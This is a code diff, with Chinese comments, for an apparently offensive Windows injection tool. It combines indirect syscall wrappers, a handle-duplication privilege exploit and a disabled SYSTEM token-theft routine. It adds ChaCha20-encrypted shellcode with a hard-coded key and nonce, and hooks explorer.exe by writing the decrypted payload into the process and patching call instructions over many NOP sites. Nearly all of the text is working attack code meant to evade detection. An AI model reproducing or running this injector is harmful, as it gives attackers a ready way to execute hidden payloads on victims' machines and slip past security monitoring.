 NTSTATUS SFNtAccessCheckAndAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, PUNICODE_STRING ObjectTypeName, PUNICODE_STRING ObjectName, PSECURITY_DESCRIPTOR SecurityDescriptor, ACCESS_MASK DesiredAccess, PGENERIC_MAPPING GenericMapping, BOOLEAN ObjectCreation, PACCESS_MASK GrantedAccess, PBOOLEAN AccessStatus, PBOOLEAN GenerateOnClose) { Params.param[1] = (DWORD_PTR)SubsystemName; Params.param[2] = (DWORD_PTR)HandleId; Params.param[3] = (DWORD_PTR)ObjectTypeName; Params.param[4] = (DWORD_PTR)ObjectName; Params.param[5] = (DWORD_PTR)SecurityDescriptor; Params.param[6] = (DWORD_PTR)DesiredAccess; Params.param[7] = (DWORD_PTR)GenericMapping; Params.param[8] = (DWORD_PTR)ObjectCreation; Params.param[9] = (DWORD_PTR)GrantedAccess; Params.param[10] = (DWORD_PTR)AccessStatus; Params.param[11] = (DWORD_PTR)GenerateOnClose; Params.ParamNum = 11; Params.FuncHash = 0x0D2AC33F1; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
@@ -283,7 +299,6 @@ NTSTATUS SFNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS K
 NTSTATUS SFNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions) { Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)IoStatusBlock; Params.param[5] = (DWORD_PTR)ShareAccess; Params.param[6] = (DWORD_PTR)OpenOptions; Params.ParamNum = 6; Params.FuncHash = 0x0B265E2D2; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) { Params.param[1] = (DWORD_PTR)Alertable; Params.param[2] = (DWORD_PTR)DelayInterval; Params.ParamNum = 2; Params.FuncHash = 0x0306872B5; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) { Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)Event; Params.param[3] = (DWORD_PTR)ApcRoutine; Params.param[4] = (DWORD_PTR)ApcContext; Params.param[5] = (DWORD_PTR)IoStatusBlock; Params.param[6] = (DWORD_PTR)FileInformation; Params.param[7] = (DWORD_PTR)Length; Params.param[8] = (DWORD_PTR)FileInformationClass; Params.param[9] = (DWORD_PTR)ReturnSingleEntry; Params.param[10] = (DWORD_PTR)FileName; Params.param[11] = (DWORD_PTR)RestartScan; Params.ParamNum = 11; Params.FuncHash = 0x0B2198292; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
-NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)SystemInformationClass; Params.param[2] = (DWORD_PTR)SystemInformation; Params.param[3] = (DWORD_PTR)SystemInformationLength; Params.param[4] = (DWORD_PTR)ReturnLength; Params.ParamNum = 4; Params.FuncHash = 0x09E349EA7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) { Params.param[1] = (DWORD_PTR)SectionHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.ParamNum = 3; Params.FuncHash = 0x009A5E9F3; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtQueryTimer(HANDLE TimerHandle, TIMER_INFORMATION_CLASS TimerInformationClass, PVOID TimerInformation, ULONG TimerInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)TimerHandle; Params.param[2] = (DWORD_PTR)TimerInformationClass; Params.param[3] = (DWORD_PTR)TimerInformation; Params.param[4] = (DWORD_PTR)TimerInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5; Params.FuncHash = 0x0B11BE1B8; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
 NTSTATUS SFNtFsControlFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG FsControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength) { Params.param[1] = (DWORD_PTR)FileHandle; Params.param[2] = (DWORD_PTR)Event; Params.param[3] = (DWORD_PTR)ApcRoutine; Params.param[4] = (DWORD_PTR)ApcContext; Params.param[5] = (DWORD_PTR)IoStatusBlock; Params.param[6] = (DWORD_PTR)FsControlCode; Params.param[7] = (DWORD_PTR)InputBuffer; Params.param[8] = (DWORD_PTR)InputBufferLength; Params.param[9] = (DWORD_PTR)OutputBuffer; Params.param[10] = (DWORD_PTR)OutputBufferLength; Params.ParamNum = 10; Params.FuncHash = 0x069D3A98B; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\Windows\\notepad.exe"); return 0; }
@@ -771,8 +786,8 @@ DWORD_PTR ConvertSvcNameToPid(wchar_t* SvcName) {
     free(buffer);
     return 0;
 }
-
-void LocalPrivilege() {
+/* 该提权函数在 Windows 11 失效
+BOOL LocalPrivilege() {
     ULONG bufferSize = 1024 * 1024;
     PVOID buffer = malloc(bufferSize);
     SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
@@ -784,7 +799,6 @@ void LocalPrivilege() {
             CLIENT_ID clientId = { processInfo->UniqueProcessId, NULL };
             HANDLE hTokenProcess = 0;
             SFNtOpenProcess(&hTokenProcess, PROCESS_QUERY_LIMITED_INFORMATION, &objectAttributes, &clientId);
-
             if (hTokenProcess) {
                 HANDLE hToken = 0;
                 SFNtOpenProcessToken(hTokenProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken);
@@ -800,13 +814,16 @@ void LocalPrivilege() {
                     SID_NAME_USE userUse;
                     BOOL userLookupSuccess = LookupAccountSidW(NULL, tokenUser->User.Sid, userName, &userNameSize, userDomain, &userDomainSize, &userUse);
                     if (userLookupSuccess && wcscmp(userName, L"SYSTEM") == 0) {
+#ifdef DEBUG
+                        printf("[+] SYSTEM Primary Token Obtained.\n");
+#endif
                         HANDLE hImpersonationToken = 0;
-                        SECURITY_QUALITY_OF_SERVICE sqos = {sizeof(sqos), SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE};
-                        OBJECT_ATTRIBUTES objAttr = {sizeof(objAttr), NULL, NULL, OBJ_KERNEL_HANDLE, NULL, &sqos};
+                        SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_DYNAMIC_TRACKING, FALSE };
+                        OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr), NULL, NULL, OBJ_KERNEL_HANDLE, NULL, &sqos };
                         SFNtDuplicateToken(hToken, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &objAttr, FALSE, TokenImpersonation, &hImpersonationToken);
                         SFNtSetInformationThread((HANDLE)(LONG_PTR)-2, ThreadImpersonationToken, &hImpersonationToken, sizeof(HANDLE));
                         free(tokenUser);
-                        break;
+                        return TRUE;
                     }
                     free(tokenUser);
                 }
@@ -815,73 +832,151 @@ void LocalPrivilege() {
         processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
     }
     free(buffer);
-}
-
+    return FALSE;
+}*/
 // 感谢CodeWhiteSec对句柄提权的研究 代码改编自https://github.com/codewhitesec/SysmonEnte/
 HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes) {
     HANDLE hDupPriv = NULL;
     HANDLE hHighPriv = NULL;
     NTSTATUS SFSTATUS_UNSUCCESSFUL;
     ULONG options = 0;
+#ifdef DEBUG
+    printf("[*] Exploiting Handle Elevation Vuln... Stage(1/2)\n");
+#endif
     SFNtDuplicateObject((HANDLE)(LONG_PTR)-1, hProcess, (HANDLE)(LONG_PTR)-1, &hDupPriv, PROCESS_DUP_HANDLE, FALSE, 0);
+#ifdef DEBUG
+    printf("[*] Exploiting Handle Elevation Vuln... Stage(2/2)\n");
+#endif
     SFNtDuplicateObject(hDupPriv, (HANDLE)(LONG_PTR)-1, (HANDLE)(LONG_PTR)-1, &hHighPriv, DesiredAccess, HandleAttributes, options);
     return hHighPriv;
 }
 
-unsigned char shellcode[] = {
-0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
-0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
-0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
-0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
-0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
-0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
-0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
-0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
-0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
+unsigned char encrypted_shellcode[] = {
+    0x3B, 0x75, 0x43, 0xB9, 0x1F, 0x8B, 0x2A, 0x04, 0x4E, 0x39, 0x91, 0x75, 0x7C, 0xBA, 0xEC, 0x5C, 0xEC, 0xE8, 0x94, 0xB3, 0xE0, 0xC8, 0xBD, 0x94, 0x33, 0xE5, 0x7B, 0xE5, 0x9C, 0xD8, 0x51, 0x07, 0xC9, 0x47, 0x86, 0x87, 0xCE, 0xC8, 0x85, 0xFB, 0x8F, 0x28, 0x1F, 0xDA, 0x84, 0x5D, 0xD6, 0xCD, 0x70, 0x61, 0x04, 0x5F, 0x54, 0x0D, 0xD8, 0x8A, 0x66, 0x5F, 0xC2, 0x55, 0x0E, 0x6B, 0xA2, 0x49, 0xF3, 0xA3, 0xED, 0x8C, 0x94, 0xE3, 0x98, 0xAE, 0xF4, 0x6D, 0x71, 0x6E, 0x49, 0xCA, 0xC7, 0xCB, 0x1B, 0xEA, 0x89, 0x6E, 0x7C, 0xEF, 0x8C, 0x2E, 0x38, 0x99, 0xFB, 0x0B, 0x9F, 0x04, 0x75, 0xB9, 0xEE, 0xD7, 0xC5, 0x67, 0x38, 0x8B, 0xA1, 0x03, 0x97, 0xAF
 };
 
-const unsigned char pattern[] = { // 注入点特征码
-    0xf6, 0x43, 0x1c, 0x01,
-    0x0f, 0x85, 0x11, 0x8d, 0x03, 0x00,
-    0x48, 0x8b, 0x4e, 0x08, 
-    0xba, 0xff, 0xff, 0xff, 0xff,
-    0x48, 0xff, 0x15, 0x5e, 0xff, 0x07, 0x00,
-    0x0f, 0x1f, 0x44, 0x00, 0x00 // 注入点 5字节
+// 密钥和 nonce：
+unsigned char key[] = { 0xCA, 0x0E, 0xD0, 0xA6, 0x32, 0x52, 0xFB, 0xF2, 0x9F, 0xCA, 0x1F, 0xCD, 0x60, 0xDC, 0x79, 0x81, 0x45, 0x23, 0x53, 0x77, 0x37, 0x32, 0x80, 0x0E, 0xAD, 0x15, 0xD2, 0xD8, 0xFE, 0x5C, 0x6E, 0x35 };
+unsigned char nonce[] = { 0xD2, 0x3C, 0x26, 0xC2, 0x34, 0x2B, 0x18, 0x9E, 0xF7, 0xBC, 0x3B, 0x47, 0x10, 0xFD, 0x76, 0x4E };
+
+// 左旋转宏
+#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
+
+// ChaCha20 轮函数
+void chacha20_quarter_round(uint32_t* a, uint32_t* b, uint32_t* c, uint32_t* d) {
+    *a += *b; *d = ROTL32(*d ^ *a, 16);
+    *c += *d; *b = ROTL32(*b ^ *c, 12);
+    *a += *b; *d = ROTL32(*d ^ *a, 8);
+    *c += *d; *b = ROTL32(*b ^ *c, 7);
+}
+
+// ChaCha20 块函数
+void chacha20_block(uint32_t* state, uint8_t* keystream) {
+    uint32_t x[16];
+    memcpy(x, state, 16 * sizeof(uint32_t));
+    for (int i = 0; i < 10; i++) {
+        chacha20_quarter_round(&x[0], &x[4], &x[8], &x[12]);
+        chacha20_quarter_round(&x[1], &x[5], &x[9], &x[13]);
+        chacha20_quarter_round(&x[2], &x[6], &x[10], &x[14]);
+        chacha20_quarter_round(&x[3], &x[7], &x[11], &x[15]);
+        chacha20_quarter_round(&x[0], &x[5], &x[10], &x[15]);
+        chacha20_quarter_round(&x[1], &x[6], &x[11], &x[12]);
+        chacha20_quarter_round(&x[2], &x[7], &x[8], &x[13]);
+        chacha20_quarter_round(&x[3], &x[4], &x[9], &x[14]);
+    }
+    for (int i = 0; i < 16; i++) {
+        x[i] += state[i];
+    }
+    for (int i = 0; i < 16; i++) {
+        keystream[i * 4 + 0] = (x[i] >> 0) & 0xFF;
+        keystream[i * 4 + 1] = (x[i] >> 8) & 0xFF;
+        keystream[i * 4 + 2] = (x[i] >> 16) & 0xFF;
+        keystream[i * 4 + 3] = (x[i] >> 24) & 0xFF;
+    }
+}
+
+// 解密函数
+void decrypt_shellcode(const unsigned char* encrypted, size_t len,
+    const unsigned char* key, const unsigned char* nonce,
+    unsigned char* decrypted) {
+    // Initialize ChaCha20 state
+    uint32_t state[16];
+
+    // Constants
+    state[0] = 0x61707865; // "expa"
+    state[1] = 0x3320646e; // "nd 3"
+    state[2] = 0x79622d32; // "2-by"
+    state[3] = 0x6b206574; // "te k"
+
+    // Key (32 bytes)
+    for (int i = 0; i < 8; i++) {
+        state[4 + i] = ((uint32_t)key[4 * i]) |
+            ((uint32_t)key[4 * i + 1] << 8) |
+            ((uint32_t)key[4 * i + 2] << 16) |
+            ((uint32_t)key[4 * i + 3] << 24);
+    }
+
+    // Nonce (nonce[4:16] -> state[13-15])
+    state[13] = ((uint32_t)nonce[4]) | ((uint32_t)nonce[5] << 8) |
+        ((uint32_t)nonce[6]) << 16 | ((uint32_t)nonce[7] << 24);
+    state[14] = ((uint32_t)nonce[8]) | ((uint32_t)nonce[9] << 8) |
+        ((uint32_t)nonce[10]) << 16 | ((uint32_t)nonce[11] << 24);
+    state[15] = ((uint32_t)nonce[12]) | ((uint32_t)nonce[13] << 8) |
+        ((uint32_t)nonce[14]) << 16 | ((uint32_t)nonce[15] << 24);
+
+    // Initial counter (nonce[0:4])
+    uint32_t initial_counter = ((uint32_t)nonce[0]) | ((uint32_t)nonce[1] << 8) |
+        ((uint32_t)nonce[2] << 16) | ((uint32_t)nonce[3] << 24);
+
+    uint8_t keystream[64];
+    size_t num_blocks = (len + 63) / 64; // Number of 64-byte blocks
+
+    for (size_t block = 0; block < num_blocks; block++) {
+        state[12] = initial_counter + block; // Counter increments per block
+        chacha20_block(state, keystream);
+
+        size_t start = block * 64;
+        size_t end = (start + 64 < len) ? start + 64 : len;
+        for (size_t i = start; i < end; i++) {
+            decrypted[i] = encrypted[i] ^ keystream[i - start];
+        }
+    }
+}
+
+unsigned char* Chacha20Decrypt(unsigned char* encrypted, size_t len) {
+    unsigned char* decrypted = (unsigned char*)malloc(len);
+    decrypt_shellcode(encrypted, len, key, nonce, decrypted);
+    //for (size_t i = 0; i < len; i++) { // 输出解密后结果
+    //    printf("0x%02X ", decrypted[i]);
+    //    if ((i + 1) % 12 == 0) printf("\n");
+    //}
+    //printf("\n");
+    return decrypted;
+}
+
+// Hook点特征码
+const unsigned char HookingPattern[] = { 0x0f, 0x1f, 0x44, 0x00, 0x00 }; // nop [rax+rax]
+const SIZE_T HookingPatternSize = sizeof(HookingPattern);
+
+// 映像末尾特征码
+const unsigned char InjectPointPattern[] = {
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
-const SIZE_T patternSize = sizeof(pattern);
-const SIZE_T injectionOffset = 26; // 0x0f1f440000 在特征码中的偏移
+const SIZE_T InjectPointPatternSize = sizeof(InjectPointPattern);
+const SIZE_T InjectPointOffset = 0; // 注意 这是负的 
 
-PVOID FindInjectionPoint(HANDLE hWinLogon, PVOID ImageBase) {
-    SIZE_T imageSize = 609 * 1024; // 609kB = 623,616 字节
-    unsigned char* buffer = (unsigned char*)malloc(imageSize);
-    SIZE_T bytesRead;
-    SFNtReadVirtualMemory(hWinLogon, ImageBase, buffer, imageSize, &bytesRead);
-    for (SIZE_T i = 0; i < bytesRead - patternSize; i++) {
-        if (memcmp(buffer + i, pattern, patternSize) == 0) {
-            PVOID HookAddress = (PVOID)((uintptr_t)ImageBase + i + injectionOffset);
-            free(buffer);
-            return HookAddress;
-        }
-    }
-
-    free(buffer);
-    return NULL; // 未找到
-}
-
-// https://github.com/lsecqt/ThreadlessInject-C-Implementation/
-PVOID FindMemoryHole(HANDLE hProcess, PVOID referenceAddress, SIZE_T size) {
-    UINT_PTR startAddress = ((UINT_PTR)referenceAddress & 0xFFFFFFFFFFF00000) - 0x70000000; // 从参考地址向下 1.75GB
-    UINT_PTR endAddress = (UINT_PTR)referenceAddress + 0x70000000; // 向上 1.75GB
-    for (UINT_PTR addr = startAddress; addr < endAddress; addr += 0x10000) { // 按 64KB 递增
-        PVOID lpAddr = (PVOID)addr;
-        SIZE_T allocSize = size;
-        SFNtAllocateVirtualMemory(hProcess, &lpAddr, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (lpAddr != NULL) {
-            return lpAddr;
-        }
-    }
-    return NULL;
-}
+/*
+// C标准库启动函数特征码
+const unsigned char InjectPointPattern[] = { // Shellcode 注入点特征码 该注入点可容纳 918B 大小的Shellcode
+    0xf6, 0x44, 0x24, 0x7c, 0x01, // test byte ptr [rsp+7Ch],1
+    0x0f, 0xb7, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, // movzx eax,word ptr [rsp+80h]
+    0x41, 0xb9, 0x0a, 0x00, 0x00, 0x00, // mov r9d,0Ah
+    0x44, 0x0f, 0x45, 0xc8, // cmovne r9d,eax
+    0x4c, 0x8b, 0xc3, // mov r8,rbx
+    0x33, 0xd2 // xor edx,edx
+};
+const SIZE_T InjectPointPatternSize = sizeof(InjectPointPattern);
+const SIZE_T InjectPointOffset = 0x2C0; // 注意 这是负的 */
 
 PVOID GetProcessImageBase(HANDLE hProcess) {
     PROCESS_BASIC_INFORMATION pbi;
@@ -892,56 +987,112 @@ PVOID GetProcessImageBase(HANDLE hProcess) {
     return peb.ImageBaseAddress;
 }
 
+SIZE_T FindAllHookingPoints(HANDLE hExplorer, PVOID ImageBase, PVOID* HookAddresses, SIZE_T maxHooks) {
+    SIZE_T imageSize = 609 * 1024;
+    unsigned char* buffer = (unsigned char*)malloc(imageSize);
+    SIZE_T bytesRead;
+    SIZE_T hookCount = 0;
+
+    SFNtReadVirtualMemory(hExplorer, ImageBase, buffer, imageSize, &bytesRead);
+
+    for (SIZE_T i = 0; i < bytesRead - HookingPatternSize && hookCount < maxHooks; i++) {
+        if (memcmp(buffer + i, HookingPattern, HookingPatternSize) == 0) {
+            HookAddresses[hookCount] = (PVOID)((uintptr_t)ImageBase + i);
+            hookCount++;
+        }
+    }
+    free(buffer);
+    return hookCount;
+}
+
+PVOID FindInjectionPoint(HANDLE hExplorer, PVOID ImageBase) {
+    SIZE_T imageSize = 609 * 1024; // 609kB = 623,616 字节
+    unsigned char* buffer = (unsigned char*)malloc(imageSize);
+    SIZE_T bytesRead;
+    SFNtReadVirtualMemory(hExplorer, ImageBase, buffer, imageSize, &bytesRead);
+    for (SIZE_T i = 0; i < bytesRead - InjectPointPatternSize; i++) {
+        if (memcmp(buffer + i, InjectPointPattern, HookingPatternSize) == 0) {
+            PVOID InjectAddress = (PVOID)((uintptr_t)ImageBase + i - InjectPointOffset);
+            free(buffer);
+            return InjectAddress;
+        }
+    }
+    free(buffer);
+#ifdef DEBUG
+    printf("[-] Failed to Locate Injection Point!");
+#endif
+    exit(1);
+}
+
 int main() {
-    // Step 1: 权限提升 获取winlogon.exe的完全访问句柄
+    // Step 1: 权限提升 获取Explorer的完全访问句柄
     AddVectoredExceptionHandler(1, ExceptionHandler);
-    DWORD_PTR WinLogonPid = ConvertProcNameToPid(L"inlog"); // 即 winlogon.exe
-    #ifdef DEBUG
-    printf("[+] WinLogon PID Found: %lu\n", (unsigned long)WinLogonPid);
-    #endif
-    HANDLE hWinLogonLowPriv = 0;
-    CLIENT_ID clientId = { (HANDLE)WinLogonPid, 0 };
+    DWORD_PTR ExplorerPid = ConvertProcNameToPid(L"plor"); // Explorer.exe
+#ifdef DEBUG
+    printf("[+] Explorer PID Found: %lu\n", (unsigned long)ExplorerPid);
+#endif
+    HANDLE hExplorerLowPriv = 0;
+    CLIENT_ID clientId = { (HANDLE)ExplorerPid, 0 };
     OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };
-    SFNtOpenProcess(&hWinLogonLowPriv, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
-    LocalPrivilege();
-    HANDLE hWinLogon = ElevateHandle(hWinLogonLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
-    // Step 2: 解析PEB 寻找注入点
-    PVOID ImageBase = GetProcessImageBase(hWinLogon);
-    PVOID HookAddress = FindInjectionPoint(hWinLogon, ImageBase);
+    SFNtOpenProcess(&hExplorerLowPriv, PROCESS_QUERY_LIMITED_INFORMATION, &objAttr, &clientId);
+    HANDLE hExplorer = ElevateHandle(hExplorerLowPriv, PROCESS_ALL_ACCESS, OBJ_INHERIT);
+#ifdef DEBUG
+    if (hExplorer != 0) {
+        printf("[+] Successfully Obtained PROCESS_FULL_ACCESS Handle.\n");
+    }
+    else {
+        printf("[-] Failed to Elevate Handle!");
+        system("pause");
+        exit(1);
+    }
+#endif
 
-    // Step 3: 寻找内存空洞 分配内存
-    PVOID memoryHoleAddress = NULL;
-    SIZE_T payloadSize = sizeof(shellcode);
-    memoryHoleAddress = FindMemoryHole(hWinLogon, HookAddress, payloadSize);
-    #ifdef DEBUG
-    printf("[+] Memory allocated at: 0x%p\n", memoryHoleAddress);
-    #endif
+    // Step 2: 解析PEB 寻找Hook点和注入点
+    PVOID ImageBase = GetProcessImageBase(hExplorer);
+    PVOID HookAddresses[1024];  // 1024个注入点
+    SIZE_T hookCount = FindAllHookingPoints(hExplorer, ImageBase, HookAddresses, 1024);
+    PVOID ShellcodeAddress = FindInjectionPoint(hExplorer, ImageBase);
+    if (hookCount == 0) {
+#ifdef DEBUG
+        printf("[-] No hooking points found!\n");
+#endif
+        exit(1);
+    }
 
-    // Step 4: 写入内联Hook
-    SIZE_T regionSize = 8;
+    // Step 3: 解密Shellcode
+    unsigned char* shellcode = Chacha20Decrypt(encrypted_shellcode, sizeof(encrypted_shellcode));
+
+    // Step 4: 写入Shellcode
     ULONG oldProtect = 0;
-    PVOID baseAddress = HookAddress;
-    SFNtProtectVirtualMemory(hWinLogon, &baseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-    #ifdef DEBUG
-    printf("[+] Memory protection changed to RWX at 0x%p\n", (void*)baseAddress);
-    #endif
-    int32_t callOffset = (int32_t)((DWORD_PTR)memoryHoleAddress - ((DWORD_PTR)HookAddress + 5));
-    unsigned char callShellcode[] = { 0xE8, 0x00, 0x00, 0x00, 0x00 };
-    *(int32_t*)(callShellcode + 1) = callOffset;
+    SIZE_T regionSize = sizeof(encrypted_shellcode);
     SIZE_T bytesWritten = 0;
-    SFNtWriteVirtualMemory(hWinLogon, HookAddress, callShellcode, sizeof(callShellcode), &bytesWritten);
-    #ifdef DEBUG
-    printf("[+] Call instruction written at 0x%p, pointing to 0x%p\n", (void*)HookAddress, memoryHoleAddress);
-    #endif
+    PVOID ProtectAddress = ShellcodeAddress; // NtProtectVirtualMemory会修改传入的内存地址
+    SFNtProtectVirtualMemory(hExplorer, &ProtectAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    SFNtWriteVirtualMemory(hExplorer, ShellcodeAddress, shellcode, sizeof(encrypted_shellcode), &bytesWritten);
+#ifdef DEBUG
+    printf("[+] Shellcode written to 0x%p\n", ShellcodeAddress);
+#endif
+    ProtectAddress = ShellcodeAddress;
+    SFNtProtectVirtualMemory(hExplorer, &ProtectAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
 
-    // Step 5: 写入 Shellcode
-    SFNtWriteVirtualMemory(hWinLogon, memoryHoleAddress, shellcode, sizeof(shellcode), &bytesWritten);
-    SFNtProtectVirtualMemory(hWinLogon, &memoryHoleAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
-    SFNtProtectVirtualMemory(hWinLogon, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect); // 恢复内存保护
-    #ifdef DEBUG
-    printf("[+] Payload written to 0x%p\n", memoryHoleAddress);
-    printf("[+] Injection successful, waiting for NtWaitForSingleObject to trigger!\n");
-    system("pause");
-    #endif
+    // Step 5: 写入Hook
+    unsigned char callShellcode[] = { 0xE8, 0x00, 0x00, 0x00, 0x00 };
+    regionSize = sizeof(callShellcode);
+    for (SIZE_T i = 0; i < hookCount; i++) {
+        PVOID HookAddress = HookAddresses[i];
+        int32_t callOffset = (int32_t)((DWORD_PTR)ShellcodeAddress - ((DWORD_PTR)HookAddress + 5));
+        *(int32_t*)(callShellcode + 1) = callOffset;
+        ProtectAddress = HookAddress;
+        SFNtProtectVirtualMemory(hExplorer, &ProtectAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+        SFNtWriteVirtualMemory(hExplorer, HookAddress, callShellcode, sizeof(callShellcode), &bytesWritten);
+        SFNtProtectVirtualMemory(hExplorer, &HookAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
+    }
+#ifdef DEBUG
+    printf("[+] Inline Hook Placed.\n");
+#endif
+#ifdef DEBUG
+    printf("[+] Injection successful, waiting for NtWaitForSingleObject to return!\n");
+    while (TRUE);
+#endif
     return 0;
 }
